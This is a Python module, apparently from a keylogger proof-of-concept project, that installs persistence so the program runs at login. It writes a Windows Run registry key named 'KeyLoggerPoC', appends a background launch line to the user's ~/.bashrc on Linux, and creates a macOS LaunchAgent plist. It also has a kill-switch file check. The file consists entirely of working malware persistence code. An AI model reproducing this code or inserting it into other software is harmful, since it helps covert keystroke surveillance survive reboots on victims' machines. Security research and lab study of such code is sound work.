import os
import sys
import platform
from utils.config import KILL_SWITCH_FILE

def add_to_startup():
    file_path = os.path.realpath(sys.argv[0])
    system = platform.system()

    try:
        if system == "Windows":
            import winreg as reg
            key = reg.HKEY_CURRENT_USER
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            reg_key = reg.OpenKey(key, reg_path, 0, reg.KEY_ALL_ACCESS)
            reg.SetValueEx(reg_key, "KeyLoggerPoC", 0, reg.REG_SZ, file_path)
            reg.CloseKey(reg_key)
        elif system == "Linux":
            with open(os.path.expanduser("~/.bashrc"), "a") as f:
                f.write(f"\npython3 {file_path} &\n")
        elif system == "Darwin":  # macOS
            plist = os.path.expanduser("~/Library/LaunchAgents/com.keylogger.poc.plist")
            with open(plist, "w") as f:
                f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.keylogger.poc</string>
    <key>ProgramArguments</key>
    <array><string>python3</string><string>{file_path}</string></array>
    <key>RunAtLoad</key><true/>
</dict>
</plist>""")
        print("[+] Added to startup.")
    except Exception as e:
        print(f"[!] Startup persistence failed: {e}")

def kill_switch_present():
    return os.path.exists(KILL_SWITCH_FILE)
